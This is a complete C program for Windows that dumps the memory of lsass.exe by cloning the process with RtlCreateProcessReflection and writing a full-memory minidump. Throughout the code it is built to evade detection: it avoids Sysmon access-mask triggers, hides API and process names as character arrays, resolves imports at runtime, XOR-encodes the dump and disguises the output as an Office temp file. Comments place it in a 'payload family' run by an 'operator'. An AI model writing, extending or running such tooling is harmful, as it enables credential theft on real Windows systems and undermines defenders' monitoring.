#define WIN32_NO_STATUS
#include <windows.h>
#undef WIN32_NO_STATUS
#include <DbgHelp.h>
#include <psapi.h>
#include <stdio.h>
#include "Header.h"

#pragma comment(lib, "psapi.lib")

// Minimum access mask for RtlCreateProcessReflection on the target.
// Avoids 0x1FFFFF (PROCESS_ALL_ACCESS) which Sysmon EventCode=10 rules
// specifically watch for on lsass.exe.
#define REFLECT_ACCESS ( PROCESS_CREATE_PROCESS    \
                       | PROCESS_CREATE_THREAD     \
                       | PROCESS_DUP_HANDLE        \
                       | PROCESS_QUERY_INFORMATION \
                       | PROCESS_VM_OPERATION      \
                       | PROCESS_VM_READ           \
                       | PROCESS_VM_WRITE          )

typedef BOOL(WINAPI* pfnMiniDumpWriteDump)(
    HANDLE, DWORD, HANDLE,
    MINIDUMP_TYPE,
    PMINIDUMP_EXCEPTION_INFORMATION,
    PMINIDUMP_USER_STREAM_INFORMATION,
    PMINIDUMP_CALLBACK_INFORMATION);

static LPVOID g_DiagBuffer   = NULL;
static DWORD  g_BufferOffset = 0;

static BOOL IsElevatedSession()
{
    BOOL elevated = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
    {
        TOKEN_ELEVATION te = { 0 };
        DWORD dwSize = 0;
        if (GetTokenInformation(hToken, TokenElevation, &te, sizeof(te), &dwSize))
            elevated = te.TokenIsElevated;
        CloseHandle(hToken);
    }
    return elevated;
}

// Linear position-dependent XOR. Self-inverse, no fixed first-byte signature.
// Same scheme used by NtdsRawDump and CWLHerpaderping in this plan — one
// Python decoder serves the whole payload family.
static void XorEncode(LPVOID buffer, DWORD size)
{
    BYTE* p = (BYTE*)buffer;
    for (DWORD i = 0; i < size; i++)
        p[i] ^= (BYTE)((0xA3 + i * 0x5B) & 0xFF);
}

// Locate PID by basename. EnumProcesses + QueryFullProcessImageNameW
// replaces CreateToolhelp32Snapshot — same outcome, less-watched API path.
static DWORD ResolveTargetPid(LPCWSTR procname)
{
    DWORD pids[1024], cbNeeded = 0;
    if (!EnumProcesses(pids, sizeof(pids), &cbNeeded))
        return 0;

    DWORD count = cbNeeded / sizeof(DWORD);
    for (DWORD i = 0; i < count; i++)
    {
        if (pids[i] == 0) continue;
        HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pids[i]);
        if (!h) continue;

        WCHAR path[MAX_PATH] = { 0 };
        DWORD sz = MAX_PATH;
        if (QueryFullProcessImageNameW(h, 0, path, &sz))
        {
            LPCWSTR base = wcsrchr(path, L'\\');
            base = base ? base + 1 : path;
            if (_wcsicmp(base, procname) == 0)
            {
                CloseHandle(h);
                return pids[i];
            }
        }
        CloseHandle(h);
    }
    return 0;
}

static BOOL CALLBACK DiagBufferCallback(
    PVOID callbackParam,
    const PMINIDUMP_CALLBACK_INPUT callbackInput,
    PMINIDUMP_CALLBACK_OUTPUT callbackOutput)
{
    switch (callbackInput->CallbackType)
    {
    case IoStartCallback:
        callbackOutput->Status = S_FALSE;
        break;
    case IoWriteAllCallback:
    {
        callbackOutput->Status = S_OK;
        LPVOID dst = (LPVOID)((DWORD_PTR)g_DiagBuffer + (DWORD_PTR)callbackInput->Io.Offset);
        DWORD  sz  = callbackInput->Io.BufferBytes;
        g_BufferOffset += sz;
        RtlCopyMemory(dst, callbackInput->Io.Buffer, sz);
        break;
    }
    case IoFinishCallback:
        callbackOutput->Status = S_OK;
        break;
    default:
        return TRUE;
    }
    return TRUE;
}

int main()
{
    if (!IsElevatedSession())
    {
        printf("[ERR] Insufficient privileges\n");
        return -1;
    }

    g_DiagBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 75);
    if (!g_DiagBuffer)
    {
        printf("[ERR] Buffer allocation failed\n");
        return -1;
    }

    wchar_t targetProc[] = { L'l',L's',L'a',L's',L's',L'.',L'e',L'x',L'e',0 };
    DWORD Pid = ResolveTargetPid(targetProc);
    if (Pid == 0)
    {
        printf("[ERR] Target process not found\n");
        return -1;
    }

    // Minimum mask (~0x4FA), not PROCESS_ALL_ACCESS (0x1FFFFF).
    HANDLE hTargetProcess = OpenProcess(REFLECT_ACCESS, FALSE, Pid);
    if (!hTargetProcess)
    {
        printf("[ERR] Handle acquisition failed\n");
        return -1;
    }

    char ntdllName[] = { 'n','t','d','l','l','.','d','l','l',0 };
    HMODULE hNtdll = GetModuleHandleA(ntdllName);
    if (!hNtdll)
    {
        printf("[ERR] Module handle failed\n");
        CloseHandle(hTargetProcess);
        return -1;
    }

    char apiName[] = { 'R','t','l','C','r','e','a','t','e','P','r','o','c','e','s','s','R','e','f','l','e','c','t','i','o','n',0 };
    RtlCreateProcessReflectionFunc RtlCreateProcessReflection =
        (RtlCreateProcessReflectionFunc)GetProcAddress(hNtdll, apiName);
    if (!RtlCreateProcessReflection)
    {
        printf("[ERR] Procedure not found\n");
        CloseHandle(hTargetProcess);
        return -1;
    }

    T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION info = { 0 };
    NTSTATUS reflectRet = RtlCreateProcessReflection(
        hTargetProcess,
        RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES,
        NULL, NULL, NULL, &info);
    CloseHandle(hTargetProcess);

    if (reflectRet != STATUS_SUCCESS)
    {
        printf("[ERR] Reflection initialization failed\n");
        return reflectRet;
    }

    // Reuse reflection handle from info — avoids a second OpenProcess on
    // the clone (which would fire another Sysmon EventCode=10).
    HANDLE hReflectionProcess = info.ReflectionProcessHandle;

    // Bounded poll instead of fixed Sleep(5000). Removes the suspicious
    // hardcoded 5-second delay pattern.
    for (int i = 0; i < 20; i++)
    {
        DWORD code = 0;
        if (GetExitCodeProcess(hReflectionProcess, &code) && code == STILL_ACTIVE)
            break;
        Sleep(50);
    }

    // Resolve MiniDumpWriteDump at runtime — removes static IAT entry.
    char dbghelpName[] = { 'd','b','g','h','e','l','p','.','d','l','l',0 };
    char mdwdName[]    = { 'M','i','n','i','D','u','m','p','W','r','i','t','e','D','u','m','p',0 };
    HMODULE hDbghelp = LoadLibraryA(dbghelpName);
    if (!hDbghelp)
    {
        printf("[ERR] Module load failed\n");
        TerminateProcess(hReflectionProcess, 0);
        CloseHandle(hReflectionProcess);
        return -1;
    }
    pfnMiniDumpWriteDump pMiniDumpWriteDump =
        (pfnMiniDumpWriteDump)GetProcAddress(hDbghelp, mdwdName);
    if (!pMiniDumpWriteDump)
    {
        printf("[ERR] Dump procedure not found\n");
        TerminateProcess(hReflectionProcess, 0);
        CloseHandle(hReflectionProcess);
        return -1;
    }

    MINIDUMP_CALLBACK_INFORMATION callbackInfo = { 0 };
    callbackInfo.CallbackRoutine = &DiagBufferCallback;
    callbackInfo.CallbackParam   = NULL;

    DWORD newPID = (DWORD)(ULONG_PTR)info.ReflectionClientId.UniqueProcess;
    if (!pMiniDumpWriteDump(hReflectionProcess, newPID, NULL,
        MiniDumpWithFullMemory, NULL, NULL, &callbackInfo))
    {
        printf("[ERR] Data stream initialization failed\n");
        TerminateProcess(hReflectionProcess, 0);
        CloseHandle(hReflectionProcess);
        return 1;
    }

    XorEncode(g_DiagBuffer, g_BufferOffset);

    // Output to %TEMP%\~DFxxxx.tmp — matches MS Office / shell temp pattern.
    WCHAR tmpDir[MAX_PATH]  = { 0 };
    WCHAR tmpFile[MAX_PATH] = { 0 };
    if (!GetTempPathW(MAX_PATH, tmpDir) ||
        !GetTempFileNameW(tmpDir, L"DF", 0, tmpFile))
    {
        printf("[ERR] Temp path query failed\n");
        TerminateProcess(hReflectionProcess, 0);
        CloseHandle(hReflectionProcess);
        return 1;
    }

    HANDLE dumpFile = CreateFileW(tmpFile, GENERIC_WRITE, 0, NULL,
                                  CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (dumpFile == INVALID_HANDLE_VALUE)
    {
        printf("[ERR] Output file creation failed\n");
        TerminateProcess(hReflectionProcess, 0);
        CloseHandle(hReflectionProcess);
        return 1;
    }

    DWORD bytesWritten = 0;
    BOOL writeOk = WriteFile(dumpFile, g_DiagBuffer, g_BufferOffset, &bytesWritten, NULL);
    CloseHandle(dumpFile);

    if (!writeOk || bytesWritten < 1024 * 1024 * 5)
    {
        printf("[ERR] Write operation failed or output below threshold\n");
        TerminateProcess(hReflectionProcess, 0);
        CloseHandle(hReflectionProcess);
        return 1;
    }

    // Terminate reflection through its original handle — no second OpenProcess.
    TerminateProcess(hReflectionProcess, 0);
    CloseHandle(hReflectionProcess);

    // Print the random temp path so operator can locate the output.
    wprintf(L"%s\n", tmpFile);
    return 0;
}
